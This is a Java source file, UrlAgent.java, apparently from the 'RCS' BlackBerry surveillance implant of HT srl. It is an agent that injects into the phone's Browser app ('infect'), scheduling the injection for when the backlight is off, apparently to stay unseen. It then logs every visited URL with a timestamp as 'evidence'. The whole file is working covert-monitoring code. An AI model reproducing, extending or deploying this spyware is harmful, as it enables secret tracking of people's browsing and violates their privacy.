//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : UrlAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.util.Date;
import java.util.Vector;

import net.rim.device.api.system.Backlight;
import blackberry.AgentManager;
import blackberry.AppListener;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.injection.AppInjector;
import blackberry.interfaces.ApplicationObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class UrlAgent.
 */
public final class UrlAgent extends Agent implements ApplicationObserver,
        BacklightObserver {
    //#ifdef DEBUG
    static Debug debug = new Debug("UrlAgent", DebugLevel.VERBOSE);
    //#endif

    String appName = "Browser";

    AppInjector appInjector;
    //Timer applicationTimer;
    private static final long APP_TIMER_PERIOD = 5000;

    /**
     * Instantiates a new url agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public UrlAgent(final boolean agentEnabled) {
        super(Agent.AGENT_URL, agentEnabled, Conf.AGENT_URL_ON_SD, "UrlAgent");

        //#ifdef URL_FORCED
        enable(true);
        //#endif
    }

    /**
     * Instantiates a new url agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected UrlAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);

        setPeriod(APP_TIMER_PERIOD);
        setDelay(APP_TIMER_PERIOD);
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif

        AppListener.getInstance().addApplicationObserver(this);
        AppListener.getInstance().addBacklightObserver(this);

        try {
            appInjector = new AppInjector(AppInjector.APP_BROWSER);

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("actualStart: " + ex);
            //#endif
        }

    }

    private void menuInject() {
        //#ifdef DEBUG
        debug.trace("menuInject");
        //#endif

        appInjector.infect();
    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif

        AppListener.getInstance().removeApplicationObserver(this);
        AppListener.getInstance().removeBacklightObserver(this);
    }

    boolean infecting = false;

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        if (appInjector.isInfected() && Backlight.isEnabled()
                && isAppForeground) {
            //#ifdef DEBUG
            debug.info("actualRun, infected, enabled, foreground");
            //#endif

            appInjector.callMenuInContext();
        }

        if (!appInjector.isInfected() && infecting == false) {
            infecting = true;
            menuInject();
        }

    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG
        debug.trace("parse");
        //#endif

        return true;
    }

    boolean isAppForeground;

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {
        if (startedName != null && startedName.indexOf(appName) >= 0) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: foreground");
            //#endif
            isAppForeground = true;
        } else {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: not foreground");
            //#endif
            isAppForeground = false;
        }
    }

    public void onBacklightChange(boolean on) {
        if (!on && !appInjector.isInfected()) {
            //#ifdef DEBUG
            debug.info("onBacklightChange, injecting");
            //#endif

            //TODO: qui bisogna verificare che non avvengano due injection alla volta
            menuInject();
        }
    }

    public synchronized void saveUrl(String url) {
        //#ifdef DEBUG
        debug.trace("saveUrl: " + url);
        //#endif

        final Date date = new Date();
        DateTime datetime = new DateTime(date);

        int version = 0x20100713;
        final Vector items = new Vector();

        items.addElement(datetime.getStructTm());
        items.addElement(Utils.intToByteArray(version));
        items.addElement(WChar.getBytes(url, true));
        items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));

        evidence.createEvidence(null);
        evidence.writeEvidences(items);
        evidence.close();

    }

    public static UrlAgent getInstance() {
        return (UrlAgent) AgentManager.getInstance().getItem(Agent.AGENT_URL);
    }
}
